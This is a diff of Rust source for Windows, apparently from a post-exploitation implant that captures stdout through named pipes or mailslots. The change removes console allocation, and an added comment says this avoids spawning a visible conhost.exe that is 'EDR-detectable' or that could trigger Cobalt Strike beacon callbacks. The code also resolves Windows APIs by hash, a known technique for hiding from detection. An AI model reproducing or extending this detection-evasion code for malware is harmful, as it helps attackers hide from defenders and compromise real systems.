@@ -10,7 +10,7 @@ use windows_sys::Win32::Storage::FileSystem::{
     CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING, ReadFile,
 };
 use windows_sys::Win32::System::Console::{
-    AllocConsole, GetConsoleWindow, GetStdHandle, SetStdHandle, STD_OUTPUT_HANDLE,
+    GetStdHandle, SetStdHandle, STD_OUTPUT_HANDLE,
 };
 use windows_sys::Win32::System::Mailslots::{CreateMailslotA, GetMailslotInfo};
 use windows_sys::Win32::System::Pipes::CreateNamedPipeA;
@@ -20,7 +20,6 @@ pub struct IoChannel {
     handle: HANDLE,
     write_handle: HANDLE,
     saved_stdout: HANDLE,
-    own_console: bool,
 }
 
 enum Mode {
@@ -80,11 +79,10 @@ impl IoChannel {
                 (h, w, Mode::Pipe)
             };
 
-            let mut own_console = false;
-            if GetConsoleWindow().is_null() {
-                AllocConsole();
-                own_console = true;
-            }
+            // No AllocConsole — that spawns conhost.exe (visible child process,
+            // EDR-detectable, can trigger CS spawnto-injected new beacon
+            // callbacks). SetStdHandle alone is sufficient: Console.WriteLine
+            // writes to the redirected stdout HANDLE; no console WINDOW needed.
             let saved_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
             SetStdHandle(STD_OUTPUT_HANDLE, write_handle);
 
@@ -93,7 +91,6 @@ impl IoChannel {
                 handle,
                 write_handle,
                 saved_stdout,
-                own_console,
             })
         }
     }
@@ -149,15 +146,6 @@ impl Drop for IoChannel {
             SetStdHandle(STD_OUTPUT_HANDLE, self.saved_stdout);
             CloseHandle(self.write_handle);
             CloseHandle(self.handle);
-            if self.own_console {
-                if let Some(k32) = resolve_module(hash!("kernel32.dll")) {
-                    if let Some(fc) = resolve_export(k32, hash!("FreeConsole")) {
-                        type Fn = unsafe extern "system" fn() -> i32;
-                        let f: Fn = core::mem::transmute(fc);
-                        f();
-                    }
-                }
-            }
         }
     }
 }
